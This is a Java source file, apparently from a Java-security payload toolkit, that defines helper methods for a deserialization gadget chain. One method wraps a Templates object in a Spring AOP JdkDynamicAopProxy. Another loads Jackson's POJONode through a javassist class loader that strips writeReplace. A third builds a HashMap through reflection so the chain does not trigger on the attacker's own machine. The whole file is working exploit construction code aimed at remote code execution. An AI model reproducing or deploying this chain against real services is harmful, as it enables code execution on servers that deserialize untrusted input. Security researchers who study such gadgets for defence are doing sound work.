package com.xyuxu.javasec.core.payload.gadgets;

import com.xyuxu.javasec.utils.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.LoaderClassPath;

import javax.xml.transform.Templates;
import java.lang.reflect.*;
import java.util.HashMap;

public class SpringJacksonComponent {

    /**
     * 创建 Spring AOP 动态代理，强制拦截并重定向到 Templates 接口
     */
    public static Object createSpringAopProxy(Object templates) throws Exception {
        Class<?> advisedSupportClass = Class.forName("org.springframework.aop.framework.AdvisedSupport");
        Object advisedSupport = advisedSupportClass.newInstance();
        advisedSupportClass.getMethod("setTarget", Object.class).invoke(advisedSupport, templates);
        Class<?> jdkDynamicAopProxyClass = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> constructor = jdkDynamicAopProxyClass.getConstructor(advisedSupportClass);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)constructor.newInstance(new Object[] { advisedSupport });
        return Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[] { Templates.class }, handler);
    }

    /**
     * 隔离加载 Jackson 家族并移除 BaseJsonNode 的 writeReplace 方法
     */
    public static Object createJacksonPOJONode(Object wrappedObject) throws Exception {
        ClassPool pool = new ClassPool(true);
        pool.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
        ClassLoader customLoader = new ClassLoader(Thread.currentThread().getContextClassLoader()) {
            @Override
            public Class<?> loadClass(String name) throws ClassNotFoundException {
                if (name.startsWith("com.fasterxml.jackson.")) {
                    try {
                        CtClass ctClass = pool.get(name);
                        if (name.equals("com.fasterxml.jackson.databind.node.BaseJsonNode")) {
                            try {
                                CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
                                ctClass.removeMethod(writeReplace);
                            } catch (Exception ignored) {}
                        }
                        byte[] bytes = ctClass.toBytecode();
                        return defineClass(name, bytes, 0, bytes.length);
                    } catch (Exception e) {
                        return super.loadClass(name);
                    }
                }
                return super.loadClass(name);
            }
        };
        Class<?> pojoNodeClass = customLoader.loadClass("com.fasterxml.jackson.databind.node.POJONode");
        Constructor<?> ctor = pojoNodeClass.getConstructor(Object.class);
        return ctor.newInstance(wrappedObject);
    }

    /**
     * 静默组装 HashMap，防止在生成端触发哈希冲突导致本地执行
     */
    public static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {

        HashMap<Object, Object> s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class<?> nodeC = Class.forName(System.getProperty("java.version").startsWith("1.") ? "java.util.HashMap$Entry" : "java.util.HashMap$Node");
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;

    }

}